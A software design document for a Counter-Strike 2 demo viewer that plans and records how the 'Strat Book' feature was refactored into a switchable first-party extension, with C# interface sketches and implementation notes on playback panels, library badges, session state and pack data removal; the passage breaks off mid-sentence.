# Strat Book as a plugin: investigation and design

**Naming.** `docs/plugins/plugin-system-design.md` already reserves "plugin" for the CSVG game plugin that
live sync installs into CS2, and uses "add-on" for third-party code. This doc says **feature pack** for a
first-party extension shipped with the app that can be switched off as a whole, and "the Strat Book pack" for this one.
Users see it as an **extension** ("Strat Book extension").

---

## 1. Summary

The Strat Book ships as `DemoViewer.NET.Extensions.StratBook`, a first-party extension that is built
against the app and loaded by it (`IExtension`, `extension.json`, `FeaturePacks`), rather than a
third-party, runtime-loaded plugin. It lives in its own project under `src/Extensions/StratBook/`,
references the app (never the reverse), and carries its own manifest and version, so it can be signed,
staged under the config root and updated on its own release cadence, independent of the app build.

Users see one master switch, "Strat Book extension", under `pack.stratbook`. Turning it off is live and
real: every tab, pane, lane, menu, keybind and settings page it contributes disappears immediately, its
evaluators and background jobs stop at the next poll, and its resident indexes (`SituationIndex`,
`GrenadeIndex`, `SignatureCache`, Team Identity) release their memory in session rather than waiting for a
restart. Data on disk is untouched; re-enabling backfills whatever indexing was missed while it was off.

The public contract is the `DemoViewer.NET.Extensions.Sdk` package (`src/Sdk/DemoViewer.NET.Extensions.Sdk`,
author guide in its README): `IExtension`, `IExtensionContributions`, `IExtensionContext` and the SDK's
playback types. Surfaces the SDK does not carry (the hub tab, status chips, rulesets, forward-pass
evaluators, the scene-frame playback surface) stay first-party behind `IFirstPartyContributions`, which the
Strat Book reaches by casting. Third-party extensions load from the same extensions folder; unverified ones
only with the user's consent, and none at all in safe mode.

The extension reaches the shell, 2D Playback and the Library through `IExtensionContributions` (tabs,
evaluators, job kinds, settings pages, playback panels and lanes, library filters and badges, session
state, commands, stores) instead of being wired by hand into `App.axaml.cs` and
`Playback2DTabViewModel`.

---

## 2. Extension API

Sketches, not code. Names follow the existing contracts. Everything here is first-party and lives in the
app or the extension project; none of it goes into the public `Modules.Abstractions` package until the
add-on work wants it.

### 2.1 The pack

```csharp
public interface IExtension
{
    string Id { get; }                       // "net.demoviewer.pack.stratbook"; persisted key, distinct from the module id
    string FeatureId { get; }                // "pack.stratbook"; the umbrella gate
    IEnumerable<FeatureDescriptor> Features { get; }   // parented to FeatureId
    void Register(IServiceCollection services);        // all DI, unconditional (factories are lazy)
    void Contribute(IExtensionContributions to, IServiceProvider sp);
}

public interface IExtensionLifecycle            // optional, resolved from the pack's own registrations
{
    Task OnEnabledAsync(ExtensionStartReason reason, CancellationToken ct);  // startup loads, subscriptions
    Task OnDisabledAsync();                  // unsubscribe, cancel owned jobs, release resident indexes (completes when released)
    void OnShutdown(TimeSpan budget);        // flushes
}

public interface IExtensionResident              // a pack-built singleton whose state can be dropped and rebuilt
{
    void Attach();                           // subscribe to the sources that keep it current; loads nothing
    void Release();                          // unsubscribe, flush what is pending, drop the state
}
```

`Register` is unconditional on purpose: registrations are free, and conditional DI makes "turn on without
restart" impossible. What the gate controls is `OnEnabledAsync`, the evaluators' predicates, and the
contributions' visibility.

### 2.2 Contributions

```csharp
public interface IExtensionContributions
{
    void Module(IWorkspaceModule module);                    // tabs and sections
    void HostTab(HostTabContribution host);                  // a tab that hosts sections (the hub)
    void Evaluator(string id, Func<IDemoEvaluator> factory, params string[] after);
    void JobKind(JobKindDescriptor kind);                    // label, rank, light, owner
    void SettingsPage(SettingsPageContribution page);        // header, order, VM factory, view factory, keywords
    void StatusChip(StatusChipContribution chip);
    void Playback(IPlaybackContribution contribution);       // see 2.3
    void Library(ILibraryContribution contribution);         // filters, card badges, sections
    void Commands(IEnumerable<CommandDescriptor> commands);  // keybinds and palette
    void Session(string key, ISessionParticipant participant);
    void Store(StoreDescriptor store);                       // paths, for "delete pack data"
    void Migration(string id, Func<IDemoProcessingQueue, Task> submit, TimeSpan delay);
    void Route(string prefix, Func<string, bool> navigate);  // "stratbook/strat/{id}"
}
```

Every contribution carries the pack's `FeatureId` implicitly (the pack registered it), and may carry a
narrower sub-feature id. The shell shows a contribution only when both resolve on.

As built: `void Shell(Action<MainViewModel> attach)` joined the list. The shell factory runs every
pack's attachments once, right after the shell is constructed and before anything can resolve it, which is
the moment the composition root used to wire a pack's delegates by hand. It exists for the delegate slots a
core page exposes (Match Overview's `IndexGrenades`, `AreGrenadesIndexed`, `PackEnabled`); an attachment
must not resolve the shell itself and reaches everything else lazily. The pack's lifecycle was the wrong
place: resolving the shell from `OnEnabledAsync` constructed it during `StartPacks`, which put the shell's
own startup loads ahead of the pack's on the queue.

### 2.3 2D Playback

```csharp
public interface IPlaybackContribution
{
    void Attach(IPlaybackSurface surface, IModuleContext context);  // per tab VM instance
    void Detach();
}

public interface IPlaybackSurface
{
    IReadOnlyList<MapLevel> MapLevels { get; }                     // the mounted viewport's levels; empty without one
    Playback2DKeymapProfile Keymap { get; }                        // the tab's resolved keymap, replaced whole on a rebind
    event Action? KeymapChanged;
    event Action? Deactivated;                                     // before the tab flushes its documents
    IDisposable OnDemoChanged(Action handler);                     // on activation and on a demo reset, after the resync
    IDisposable OnPlayheadChanged(Action<int> handler);            // the tick, on every playhead update
    IDisposable AddBandMenu(Func<TimelineBandViewModel, IEnumerable<MenuEntry>> items);
    ILaneHandle AddLane(ITimelineTrack track, TimelineBandRow row, ILaneBehaviour? behaviour = null);
    IDisposable AddModeToggle(ModeToggle toggle);                  // the toolbar renders it; its action flips it
    IPaneHandle AddPane(PanePlacement where, int order, Func<object> viewModel);  // Side; RightColumn forwards to AddPanel
    IPanelHandle AddPanel(int order, Func<object> viewModel, Func<Control>? view = null, string? featureId = null,
        ModeToggle? mode = null);                                  // shown while open, gate on and the mode on
    IDisposable AddKeyHandler(Func<Key, KeyModifiers, bool> handler);             // before the tab's keymap, in order
    IDisposable AddActionHandler(Func<Playback2DAction, bool> handler);           // unhandled actions; first while a panel has the keyboard
    IDisposable AddToolbarItem(ToolbarItem item);                                 // the toolbar and the overflow menu both list it
    IDisposable AddPointerPreHandler(Func<ScenePointer, bool> handler);           // before the tool router, on a primary press not diverted to pan
    string GestureHint(Playback2DAction action);                                  // " (Ctrl+F)" under Keymap, or "" unbound
    // Not built yet, in the order the items need them:
    void AddLayer(string layerId, Func<ISceneLayer> layer);                                     // later; guides
    void AddTool(IPointerTool tool);                                                            // later; token
}

public sealed record ScenePointer(MapLevel Level, double WorldX, double WorldY, SKPoint Screen,
    ToolModifiers Modifiers, Scene2DFrame Frame, Func<PlaceResolver?> Zones);   // Zones is lazy: read only if a handler asks

public sealed class ToolbarItem   // a button a contribution adds; also an overflow-menu entry
{
    public ToolbarItem(string id, string label, string tooltip, Func<Scene2DFrame, bool> run,
        Playback2DAction? action = null, int order = 0, string? icon = null);
    public string Label { get; set; }        // mutable: the owner refreshes it on KeymapChanged
    public string Tooltip { get; set; }
    public ICommand? Command { get; }         // wired by AddToolbarItem; what the view binds
}

public interface ILaneBehaviour   // what a lane does; the timeline dispatches to the lane whose track made the band
{
    void OnBandPressed(TimelineBandViewModel band, ITimelineData data);          // before the seek
    IEnumerable<MenuEntry> MenuFor(TimelineBandViewModel band, ITimelineData data);  // before the band-menu contributors'
    void OnLabelRequested(int frame);                                            // empty lane clicked while IsEditable
    void OnEditSpanDragged(int startFrame, int endFrame);                        // a handle of EditSpan moved
}

public interface ILaneHandle : IDisposable   // Dispose unregisters the track and its behaviour
{
    ITimelineTrack Track { get; }
    bool IsSuppressed { get; set; }          // hidden for a mode; the user's own toggle is untouched
    bool IsEditable { get; set; }            // the row shows even empty; a click asks for a label
    (int Start, int End)? EditSpan { get; set; }   // drawn with two handles; one lane's at a time
}

public sealed class ModeToggle   // a mode of the tab a contribution owns
{
    public ModeToggle(string id, string label, string tooltip, Playback2DAction? action = null, string? icon = null);
    public bool IsOn { get; set; }           // raises Changed on a flip
    public bool IsAvailable { get; set; }    // off: the toolbar hides the toggle; the action only leaves the mode
    public event Action? Changed;
}

public interface IPaneHandle : IDisposable   // Dispose removes the pane; Close only hides it
{
    bool IsOpen { get; }
    void Open();     // Side: a fresh view model, an open pane is rebuilt, the other Side pane closes. RightColumn: no-op when open
    void Close();    // disposes the view model when it is IDisposable
    event Action? Closed;
}

public interface IPanelHandle : IPaneHandle   // a right-column panel; several open at once
{
    bool IsShown { get; }            // open, gate on, and the column showing contributed panels (Review mode)
    event Action? ShownChanged;
    bool HasKeyboard { get; set; }   // the focus scope: the contribution mirrors its own focus here
}

public sealed record MenuEntry(string Header, Action Run);
```

As built (`Extensions/IPlaybackContribution.cs`, `Extensions/IPlaybackSurface.cs`): the two
registrations return disposables, so a contribution's `Detach` undoes exactly what its `Attach` added, and
`MapLevels` is on the surface because the Create Strat capture keys a pawn's Z to the mounted viewport's
floors, which only the view knows. `Playback2DTabViewModel.Surface` is the implementation
(`Playback2DSurface`): band menus join `Playback2DTimelineViewModel.BandMenus`, the contributor list that
replaced `CanCreateStrat`, `RequestCreateStrat`, `CreateStratRequested` and the single `LaneMenu` slot (the
tab's own lane menu is the first contributor); side panes bind to one host in `Playback2DView.axaml`, the
export pane's place, one open at a time, and opening one closes the export. `PlaybackContributionHost`
(`Extensions/`) attaches every pack's contributions from `PackContributionSet` to a tab and follows the
gate's `Changed` live; `BuildRegistry` hands it to `Playback2DModule`, whose tab factory gives it to each
tab view-model, which attaches on its first activation (the context arrives there) and detaches on dispose.
The tab closes any open side pane on deactivation and on demo reset, as it closed the Create Strat review
before.

The Create Strat contribution (`src/Extensions/StratBook/DemoViewer.NET.Extensions.StratBook/Modules/StratBook/CreateStratPlaybackContribution.cs`)
adds a band-menu entry for round bands whose action opens a pane it added (`AddPane(PanePlacement.Side,
...)`), using `IStratCapture` resolved from `context.GetService<T>()` at every band press, which is how the
gate reaches it. That pairing is why a 2D Playback contribution is always a pair, an entry point plus the
surface it opens: the contribution API carries both.

As built (`Extensions/IPlaybackSurface.cs`, `Modules/Playback2D/Playback2DSurface.cs`): the right
column is hosted. `AddPanel(order, viewModel, view, featureId)` adds a panel; `AddPane(PanePlacement.RightColumn,
...)` is the same call with no gate and the ViewLocator's view, and returns the same `IPanelHandle`. Right-column
handles differ from side-pane handles in three ways: several panels are open at once and `Open` on an open
panel is a no-op (the view models are long-lived, built once at attach, so a panel keeps its state across the
mode); a panel has a gate, the `featureId` read through the tab's `IModuleContext.Features`, and `IsShown`
folds the gate, the open state and the mode together, so a gated-off panel hides without closing; and a panel
has a focus scope, `HasKeyboard`, which the contribution sets from its own focus state (the palette's
`IsFocused`). `Playback2DSurface.Panels` is the ordered list of open panels the view's `ItemsControl` binds; each
item presents either the contributed control with the view model as its DataContext or the view model itself
for the ViewLocator, under a 6 px gutter, and follows `IsShown`. The core column content (game info, the player
cards) keeps its rows; the panels fill the third row as the inline views did, so the follow-card render test
passes unchanged.

Keys and actions route through the surface rather than the tab naming a panel. `AddKeyHandler` is asked by the
view before the tab's keymap, in registration order, which is how the `WhenPaletteFocused` and
`WhenSuggestionSelected` rows shadow the always rows (the handler resolves its scope against `Keymap`);
`AddActionHandler` is asked for every action the tab does not handle itself, and for every action first while
a shown panel `HasKeyboard`, which is how undo and redo are the tags' while the palette has the keyboard. The
tab's `IsReviewAvailable` is "an open panel whose gate is on", so a tab with no contributed panel offers no
Review toggle and never collapses the cards.

The palette gives the keyboard back (`Leave`: the pending tag written, the note dropped, focus off) on two
signals the contribution subscribes to and `Detach` drops: `IPlaybackSurface.Deactivated`, which the tab
raises before it flushes its documents (the contribution flushes its own session there), and
`TagSession.Detaching`, raised before a swap inside `AttachAsync` or a `Detach` lets go of the document,
while the old document is still current. So the tab calls nothing on the palette by name, and neither focus
nor a half-typed note survives a tab switch or a demo swap.

As built (`Modules/Playback2D/Timeline/ILaneBehaviour.cs`, `Extensions/ModeToggle.cs`): the lanes,
the mode and the session are the pack's, and the three hooks the panel work left (`IsReviewMode`, `ReviewModeChanged`,
`Timeline`) are gone with the tab's `TagSession`, `TagTrack`, `ProposalTrack`, `IsReviewMode`, `Tags`,
`AttachTagsToCurrentDemo` and its `TryResolve<T>` locator; the tab imports no pack namespace for them and
`PackBoundaryTests` lists no edge for it.

- *Lanes.* `AddLane(track, row, behaviour)` is `Playback2DTimelineViewModel.RegisterLane`: the track registers
  as before (registration order is display order; a track registered after the build is built at once, so a
  pack turned on in session shows its lane without a re-query) and the timeline keeps the lane beside it.
  Dispatch is by the lane that made the band, never by track id: `PressBand` calls the lane's `OnBandPressed`
  before the seek, `MenuFor` puts the lane's entries before the `BandMenus` contributors', `RequestLaneLabel`
  goes to the first editable lane, and `DragEditEdge` moves the span of the lane that owns it and tells that
  lane. The handle carries the state the contribution used to set through `Timeline`: `IsSuppressed` is
  `SetTrackSuppressed` by the track's id (the user's toggle untouched, `IsTrackSuppressed` still answers by
  id), and the row folds `IsLaneEditable`, `ShowLane`, `HasEditSpan`, `EditX` and `EditWidth` from every lane's
  `IsEditable` and `EditSpan`. Disposing the handle is `UnregisterTrack`: the toggle, the bands, the markers,
  the suppression and the lane go, and the row re-folds. The three tab-level events (`BandPressed`,
  `LaneLabelRequested`, `EditSpanDragged`) are deleted; nothing raised them for anyone else.
- *The mode.* `ModeToggle` is a contributed mode: the view's toolbar lists `Surface.ModeToggles` as
  `ToggleButton`s bound to `IsOn`, `Label`, `Tooltip` and `IsAvailable` in the slot the hardcoded Review toggle
  had; `Playback2DSurface.TryExecute` gives a keymap action to the toggle that names it first (`TryToggle`:
  flips while available or on, false when off with nothing to show, so Shift+R is nobody's then), then to the
  action handlers. A panel is bound to a mode through `AddPanel`'s `mode`, and `IsShown` folds the gate, the
  open state and the mode; a panel bound to none shows whenever it is open with its gate on. The tab's
  `IsReviewAvailable` is still an open panel whose gate is on, and `IsCardStrip` is now any panel shown
  (`Surface.HasShownPanels`), which the view's panel host and the strip rows bind.
- *The demo and the playhead.* `OnDemoChanged` is raised by the tab at the two moments it attached its tag
  session before: the end of `OnActivated` and of `OnDemoReset`, after the resync. A contribution attaches
  per-demo state there; the context's `DemoPath` may be the demo already attached. `OnPlayheadChanged` is
  raised with the tick wherever the tab calls `Timeline.UpdatePlayhead` (a clock push, the resync), which is
  how Label Mode's target follows the playhead without a click now that the contribution has no `Timeline`
  to watch.

The contribution (`ReviewPanelsPlaybackContribution`, now `IDisposable` because it owns the track) builds the
`TagSession` on attach from `context.GetService<T>()`: `TagStore` (null for session-only tags), `DemoCacheStore`
for the rounds a new tag's `round` is derived from, and `IRoundFactsSource` for its facts. It registers
`TagTrack` and `ProposalTrack` on the lane row in that order with a `TagLaneBehaviour` (Label Mode's pick on a
press, the edit and delete entries, the new label on an empty-lane click, the editor's span on a handle drag)
and a `ProposalLaneBehaviour` (the queue's pick on a press, the review entries); the proposal track's
confidence tints come from the theme tokens the tab used to supply. It registers the Review `ModeToggle`
(id `stratbook.review`, action `ToggleReviewMode`), reads its start from `Playback2D.ReviewMode` and writes
every flip back to the same key, suppresses both lanes while the mode is off, binds the three panels to it,
and sets `IsAvailable` from the two tagging gates, which is what hides the toolbar toggle when both are off.
On `OnDemoChanged` and at attach it binds the session to `context.DemoPath` (fire and forget, the hash from
`DemoSha256` or the file; the identity resolver is a constructor seam for tests); the demo already attached
is kept, a path still being attached is not attached twice (the first activation reaches both the attach
and the demo-change signal before the session's `DemoPath` moves), and a swap runs through `AttachAsync`,
whose `Detaching` lets the palette write its pending tag to the old document first. The playhead hook calls
the palette's `RefreshLabelTarget`. `Detach` writes the palette's
pending tag, disposes the panels, disposes the lane handles (the tracks leave the timeline), then the track
and the session (which flushes to the store), so a pack turned off with a tag pending loses nothing, and a
pack turned off leaves the tab with no session, no lane, no toggle and no handler. Pack off at startup builds
none of it: the tab's timeline carries the four core tracks alone, which also removed two hidden track
toggles the footer used to make room for.

One behaviour changed on purpose. Undo and redo while the palette has the keyboard report handled (true)
even when the tag history is empty; before, the tab returned the real `TagSession.Undo()` result, which made
an empty tag history leave the key unhandled. Returning true is what keeps an empty tag history from falling
through to the annotations' undo now that the focused panel is asked first; the annotations' history stays
the unfocused case's.

The contribution (`src/Extensions/StratBook/DemoViewer.NET.Extensions.StratBook/Modules/RoundTagger/Review/ReviewPanelsPlaybackContribution.cs`)
builds `TagPaletteViewModel`, `SuggestionQueueViewModel` and `ReviewPanelViewModel` over its session
with `TagPaletteStore`, `SuggestedTagsService` and `SettingsService` from `context.GetService<T>()`, and
registers them as three panels: the palette (order 0, gate `playback2d.tagger`), the review panel (order 1,
`ReviewPanelView` in the pack: the Suggested / Labels toggle, the shared editor and the Labels list the core
view used to carry inline; open while either gate is on) and the queue (order 2, gate
`playback2d.suggestedtags`, its view shown while the Suggested tab is selected). The persisted palette choice
and the background-sweep opt-in move with it. Pack off builds nothing; the host attaches and detaches it live,
and `Detach` disposes the three view models after writing the palette's pending tag.

As built (`Extensions/ScenePointer.cs`, `Extensions/ToolbarItem.cs`, `Extensions/IPlaybackSurface.cs`,
`Modules/Playback2D/ISceneFrameHost.cs`, `Modules/Playback2D/Scene2DHost.cs`): `CurrentFrame`, `Zones` and
`AddMapClickHandler` are gone from the surface, and so is the tab's `TryTagPositionAt` forwarder to
`Surface.TryHandleMapClick`. `ISceneFrameHost` itself keeps `CurrentFrame` and `Zones`: `Scene2DHost` still
reads them directly, for the zone-outline overlay and to build each `ScenePointer` in `TryPrimaryPress` (the
strat canvas's own `TryTagPositionAt` reads neither; it resolves places through `PlacesFor`). `ISceneFrameHost`
trades its one-off `TryTagPositionAt(level,
x, y)` for a default-`false` `TryPointerPreHandler(ScenePointer pointer)`; `Scene2DHost.OnPointerPressed` builds
one `ScenePointer` per primary press not diverted to pan (Space, Ctrl, the middle button) and offers it to the
bound host before the router. `Playback2DTabViewModel` forwards its `TryPointerPreHandler` to
`Surface.TryHandlePointerPress`, which tries every `AddPointerPreHandler` registration in order; the strat
canvas implements it as `ISceneFrameHost.TryPointerPreHandler(pointer) => TryTagPositionAt(pointer.Level,
pointer.WorldX, pointer.WorldY)`, an explicit forwarder that keeps its own public `TryTagPositionAt` (Set On
Map) exactly as the ~30 strat canvas tests call it. `ScenePointer.Zones` is a `Func<PlaceResolver?>`, not a
value: the review contribution's old `OnMapClick` read `surface.Zones` only after the focus checks passed, and
an eager field would force `LoadedMapAsset.ZoneLoad` on every pan click instead.

`AddToolbarItem` and the overflow menu's entries read the same `Surface.ToolbarItems` list
(`Playback2DSurface`, ordered by `ToolbarItem.Order`); `Playback2DView.axaml` renders it in the slot the
static "Rounds like this" `Button` held, and `Playback2DView.axaml.cs` rebuilds the overflow `MenuItem`s from
it on every open, after the divider `Separator` (`IsVisible="{Binding Surface.HasToolbarItems}"`, as the toolbar
row's own divider is). `TryExecute` tries a `ModeToggle` whose `Action` matches first, then a `ToolbarItem`
whose `Action` matches (`item.Run(_frame())`), then the `AddActionHandler` list, so the button, the menu entry
and the keymap action are one funnel. The Situations contribution
(`src/Extensions/StratBook/DemoViewer.NET.Extensions.StratBook/Modules/Situations/SituationsPlaybackContribution.cs`) registers the button's own text,
"Rounds like this", as `Label` (icon `⌕`, restoring today's button face, which the menu entry does not carry)
and keeps the tooltip's "Find rounds like this" wording, both with that funnel (`Playback2DAction.FindRoundsLikeThis`);
its `Run` resolves `IFindRoundsLikeThis` through `context.GetService<T>()` as `TryFindRoundsLikeThis` used to
from `App.Services`. The item is added only while `IModuleContext.MapName` is non-empty (checked at attach,
for a live pack toggle with a demo already open, and on every `OnDemoChanged`) and removed when it closes, so
"available only with a demo and a map name" is now presence, not just a silent refusal. Label and tooltip read
`IPlaybackSurface.GestureHint`, as `FindRoundsLikeThisLabel`/`FindRoundsLikeThisToolTip` did, and refresh on
`KeymapChanged`. J/K
(`NextSituationResult`/`PrevSituationResult`) move to the same contribution through `AddActionHandler`,
gated by the Situations tab's own feature exactly as the tab gated them. The tab's `FindRounds`,
`SituationResults`, `IsSituationResultWalkEnabled`, the two label/tooltip properties, `FindRoundsLikeThisCommand`,
`TryFindRoundsLikeThis`, the tab's private `GestureHint` and `using DemoViewer.NET.Modules.Situations` are gone;
`PackBoundaryTests` lists no edge for `Playback2DTabViewModel.cs`.

`AddLayer` and `AddTool` exist for completeness, for when something does contribute a layer or a tool
through the surface. The token tool and guides layer stay core-registered instead: they are inert without
a strat frame host and cost nothing. Code keeps the word "pack" for the type names; user-facing copy says
"extension".

**As built, not on `IPlaybackSurface` but on `Scene2DHost` directly.** Nothing contributes a
layer or a tool to the 2D Playback tab yet, so `IPlaybackSurface.AddLayer`/`AddTool` are still unbuilt; the
strat canvas does not go through a pack contribution or `IPlaybackSurface` at all; its own `StratCanvasView`
mounts a private `Scene2DHost` instance directly in its XAML (`<pb:Scene2DHost x:Name="Host" />`), distinct
from the Playback2D tab's. `Scene2DHost` gained the same two members, narrower: `AddTool(IPointerTool tool)`
is `Router.Register(tool)`; `AddLayer(string layerId, Func<ISceneLayer> layer)` adds the layer once,
immediately, and keeps the factory so a release/rebuild (a re-parent, a re-template) can rebuild it the way
the fixed layer set already rebuilds itself. Both are called exactly once, from `StratCanvasView`'s
constructor, right after `FindControl<Scene2DHost>("Host")`: `host.AddTool(new TokenTool())` and
`host.AddLayer(SceneLayerIds.Guides, () => new GuideLayer(() => (host.FrameHost as IGuidesHost)?.Guides ??
SceneGuides.None))`. Nothing calls either for the Playback2D tab's own host, so pack off (and the regular
tab, pack on) carries neither: not inert-and-present as before, but absent. `TokenTool` and `GuideLayer` are
pure consumers of core contracts (`IPointerTool`, `ISceneLayer`) and move to the extension with the rest of
the Playback2D Core/Pipeline split; `ITokenEditor` and `SceneGuides` do not, because `IToolServices.Tokens` and the new `IGuidesHost`
need the types regardless of whether the pack is loaded. `SceneHostToolServices.Tokens` reads
`(host.FrameHost as ITokenEditingHost)?.TokenEditor` in place of the removed `ISceneFrameHost.TokenEditor`.

### 2.4 Library, settings, session, stores

```csharp
public interface ILibraryContribution
{
    IEnumerable<LibraryFilter> Filters { get; }      // Team
    LibraryBadge? BadgeFor(DemoLibraryEntry entry);  // provenance chip; must be O(1), no I/O
}

public interface ISessionParticipant
{
    JsonElement? Snapshot();
    void Restore(JsonElement state);                 // must tolerate an old shape
}

public sealed record StoreDescriptor(string Id, string Label, StoreRoot Root, IReadOnlyList<string> Paths);
```

As built (`Extensions/IExtensionContributions.cs`): one filter and one badge per contribution rather than
a list of filters, since the Library hosts N *contributions* (each optionally offering a filter, a badge, or
both) instead of one contribution offering N filters. `LibraryFilter(Label, Items, Matches)` carries its own
items and predicate; `LibraryFilterItem(Key, Display)` reserves `Key == ""` as the neutral "All" choice the
Library skips when applying predicates. A badge needs a fourth member beyond the sketch,
`bool HasBadge { get; }`: `BadgeLabels` alone cannot say whether a contribution renders a badge at all, since
a read-only badge (no settable menu) legitimately has an empty label list. `FeatureId` (nullable, default
`null`) and `Changed` complete the interface, matching 2.2's general contract; `IExtensionContributions.Library(...)`
stamps a null `FeatureId` to the owning pack's id the same way `SettingsPage` does, through a small internal
wrapper (`PackContributions.StampedLibraryContribution`) rather than a record `with`, since `ILibraryContribution`
is an interface, not a record. `LibraryTabViewModel` owns a generic host: it calls into a contribution only
while `_isFeatureEnabled(contribution.FeatureId)` is true (set once by `MainViewModel` to `_gate.IsEnabled`),
subscribing to `Changed` only on that transition, so nothing behind `Filter`/`BadgeFor` is ever touched while
off. One `LibraryFilterViewModel` per on filter contribution is added to `ObservableCollection<LibraryFilterViewModel>
Filters`, kept as the same instance across a data refresh (`Rebuild`, preserving the ComboBox selection by
`Key`) and removed only on a gate transition (`RebuildFilters`); `ApplyFilter` folds every entry's `Matches`
in. The badge is a single slot (`ActiveBadgeContribution`, the first on contribution with `HasBadge`): the
plan's "N badges" is the contribution list, not the card UI, which renders one chip, a documented limit a
second badge-granting pack would need to lift. `LibraryTabViewModel`/`MainViewModel` lost `TeamIdentityService`
and `IDemoProvenanceSource` entirely (ctor params and `using`s both); `MainViewModel` no longer force-builds
either service at shell construction when the pack is off, since the old code's two `sp.GetRequiredService<T>()`
ctor arguments are gone. With the pack on, the default, the resolve still happens at construction, just
inside `LibraryTabViewModel`'s own `RebuildFilters` rather than `MainViewModel`'s ctor argument, so the
timing is unchanged from the previous eager resolve; only the off case is actually lazier now (see section 3's First Run note).
`DemoEntry` (`Modules/Library/DemoLibraryModels.cs`) traded `ProvenanceLabel`/
`ProvenanceIsOverride`/`ProvenanceDisplay`/`ProvenanceTooltip` for generic `BadgeLabel`/`BadgeTooltip`/
`BadgeIsPinned`; the "unlabeled" fallback and the three-state tooltip text both moved into
`ProvenanceLibraryContribution.BadgeFor`/`BadgesFor`, which always returns a badge once the service
resolves (an entry the cache has not indexed yet also reads "unlabeled", collapsing a distinction the old
field-level null preserved but the display never showed). The pack's two contributions,
`src/Extensions/StratBook/DemoViewer.NET.Extensions.StratBook/Services/Teams/TeamLibraryContribution.cs` and
`.../Services/Provenance/ProvenanceLibraryContribution.cs`, each take a `Func<T>` resolver (no DI
registration of their own, matching the Create Strat contribution's own pattern) and an optional
`featureId` constructor parameter so a caller outside `StratBookPack.Contribute` (a shell test) can name
the pack id explicitly instead of relying on the stamp.

Review pass: `BadgeFor` stayed for a single-entry read, but a full refresh calls a second interface member,
`BadgesFor(IEnumerable<DemoEntry>)` (default forwards to `BadgeFor` per entry), so
`ProvenanceLibraryContribution` can call `IDemoProvenanceSource.ResolveAll` once for the whole card grid
instead of once per card (`Resolve` re-reads and copies Team Identity's override list on every call).
`LibraryTabViewModel.OnContributionChanged` only calls `RefreshBadges` when the changed contribution is the
current `ActiveBadgeContribution`, so the Team filter's own `Changed` (a rename) never re-runs the badge
batch; it also now adds a `LibraryFilterViewModel` for a contribution whose `Filter` goes from null to
non-null via `Changed`, not only on a gate transition. `LibraryFilter` gained `Tooltip` (null defaults to
`Label`); `TeamLibraryContribution` sets it to "Filter by team" to keep the pre-refactor text.
`ILibraryContribution` gained `BadgeResetTooltip` (default null) so the reset row's own tooltip ("Let the
clan tags, the header and Team Identity decide") comes from the contribution, not a hardcoded string in the
host; `LibraryTabViewModel.BadgeMenuEntries` is `IReadOnlyList<LibraryBadgeMenuEntry>` (`Label`, `IsReset`,
`Tooltip`), not a flat string list, and the view styles a top border on the `IsReset` row's `MenuItem`
rather than mixing a literal `Separator` into the `ItemsSource`. `HasTeamFilter` (unbound) was dropped;
`HasProvenance`/`SetProvenance` renamed `HasBadge`/`SetBadgeLabel`.

Theme tokens are not a contribution: they stay in the core dictionaries, which cost nothing
when unused. A pack token manifest only matters for third-party add-ons.

As built (session only): no
`IExtensionContributions.Session` and no standalone `ISessionParticipant`. Wiring the sketch above would have
meant handing `MainViewModel`'s constructor a new `PackContributionSet`-derived parameter, and that
constructor region already belongs to the library contributions' own timing window. Instead `IHostTabViewModel` (`ViewModels/Shell/`)
carries three new, all-default members: `string? SessionPackId`, `JsonElement? SnapshotPackState()`,
`void RestorePackState(JsonElement state)`. They are new names, not the sketch's `Snapshot`/`Restore`,
because `IHostTabViewModel` already inherits `IWorkspaceTabViewModel.SnapshotState()`/`RestoreState(object?)`
(the per-TAB blob in `SessionPayload.ModuleTabs`, applied once on first activation) and a same-named,
different-signature override would shadow it (CS0108) and risk double-persisting the hub under both keys.
`SessionPayload.StratBook` becomes `Dictionary<string, JsonElement>? Packs`, keyed by pack id
(`StratBookPack.PackId`, `"net.demoviewer.pack.stratbook"`), a new trailing nullable parameter;
`ModuleTabs` is unchanged. `MainViewModel.RestoreSession`/`SnapshotSession` walk the existing `_hosts` list
(unconditional, pack-on or off, built once in `BuildWorkspaceTabs`) and read/write each host's blob by
`SessionPackId`, gated on `host.Tab.FeatureId` (the pack's umbrella gate, as `PackContributions.HostTab`
stamps it) through `_gate?.IsEnabled(...)`. A pre-`Packs` file's top-level `StratBook` member folds once
into `Packs` under the pack's id via `IJsonOnDeserialized`/`[JsonExtensionData]` on `SessionPayload`, the
same mechanism the demo cache record's own pack-payload fold uses; `SessionPayload` keeps its own literal copy of the
id string (`Models` cannot depend on `Services` or on the pack) rather than naming `StratBookPack.PackId`.
An already-present `Packs` entry for that id wins. `StratBookHubViewModel` implements the three members
over `StratBookLayout` (now in the extension project,
with `StratBookLayoutState`), whose `RestoreSessionState(JsonElement)` reads `RailCollapsed`/`ListCollapsed`
independently and accepts only `True`/`False`, so a missing member, a wrong-typed one, or a non-object
blob leaves that pane as it is instead of throwing or discarding the rest.

The hub's view model is built unconditionally in `BuildWorkspaceTabs` regardless of the gate
(`StratBookHubAccess`'s own doc comment says so), so "pack off" here is a gate check in the session code,
not something that falls out of nothing existing, and a live toggle needed its own handling rather than
falling out of the restart-time restore/snapshot pair. `_loadedPackSessions` (every pack id loaded at
startup, kept for the session's life, unlike the tab-restore-only `_pendingRestore`) is `RestorePackSessions`'s
source both at startup (`RestoreSession`) and on a live enable (`ApplyGateChange`, which calls it after
`ReconcileTabs`): a pack id already in `_restoredPackIds` (populated exactly when `RestorePackState` is
called) is skipped, so a mid-session enable restores the carried blob exactly once, the moment the pack's
gate is next observed on, and a later unrelated gate change is a no-op. `SnapshotPackSessions` writes a
host's live state when its pack is enabled right now OR its id is in `_restoredPackIds`; the second
clause is what keeps a value set while a pack was on from being lost to a later disable (the pack's own
blob, not the one loaded at startup, wins), and a pack that was never enabled this session still carries
its loaded blob through unread and unwritten.

**As built.** `StoreDescriptor` gained a fifth field, `IsUserWork`, read by the Settings
confirmation; `IExtensionContributions` gained `Store(StoreDescriptor)` and `DataRemoval(IExtensionDataRemoval)`,
aggregated on `PackContributionSet` as `Stores` and `DataRemovals`. `PackDataRemover`
(`Services/DemoCache/PackDataRemover.cs`) resolves a descriptor's paths against `AppPaths.ConfigRoot` or
`AppPaths.DemoCacheDir`, refuses anything rooted, carrying a `..` segment, or resolving to the root itself,
never follows a reparse point or deletes a `.dem` file, and strips a pack's `Packs` entry and matching
`PackStamps` from every demo cache record and index row. A demo-sidecar family (the grenade walk's
